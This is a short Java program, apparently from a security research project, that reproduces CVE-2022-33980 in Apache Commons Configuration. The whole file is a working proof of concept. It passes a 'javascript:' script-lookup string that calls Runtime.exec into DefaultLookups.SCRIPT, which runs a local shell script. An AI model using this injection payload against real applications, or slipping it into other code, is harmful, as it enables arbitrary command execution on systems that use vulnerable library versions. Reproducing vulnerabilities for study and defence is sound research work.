package com.anonuser;

import org.apache.commons.configuration2.interpol.DefaultLookups;

public class CommonsConfiguration_CVE_2022_33980 {

    public static void main(String[] args) {

        // Executes the command in the create_file.sh script

        System.out.println("Recreating CVE-2022-33980");

        String requestInput = "javascript:java.lang.Runtime.getRuntime().exec('/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh')";

        Object lookedUp = DefaultLookups.SCRIPT.getLookup().lookup(requestInput);

        System.out.println("lookedUp: " + lookedUp);
    }
}
